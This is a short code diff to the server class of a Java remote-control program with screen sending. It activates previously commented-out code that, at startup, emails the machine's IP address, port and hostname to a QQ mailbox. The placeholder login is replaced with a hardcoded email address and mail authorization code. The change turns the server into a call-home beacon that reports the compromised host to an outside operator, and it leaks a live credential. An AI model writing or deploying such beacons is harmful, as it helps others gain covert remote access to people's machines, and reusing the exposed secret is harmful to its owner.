@@ -9,6 +9,7 @@ import javax.swing.JOptionPane;
 import com.pibigstar.thread.ActionEvent;
 import com.pibigstar.thread.SendScreenThread;
 import com.pibigstar.util.GetIp;
+import com.pibigstar.util.SendEmail;
 
 /**
  * 服务端，等待控制端的接入
@@ -32,8 +33,8 @@ public class Service {
 			String ip = GetIp.getHostIp();
 			String hostName = GetIp.getHostName();
 			System.out.println("server started in:"+ip);
-			//SendEmail sendEmail = new SendEmail("你的QQ邮箱","授权码");
-			//sendEmail.sendEmail("接收邮箱", "远程控制", "IP:"+ip+":"+port+"主机名:"+hostName);
+			SendEmail sendEmail = new SendEmail("741047261@qq.com","xtyclmslgccrbdgd");
+			sendEmail.sendEmail("741047261@qq.com", "远程控制", "IP:"+ip+":"+port+"主机名:"+hostName);
 			while (true) {
 				//等待客户端的连接
 				Socket socket = serverSocket.accept();
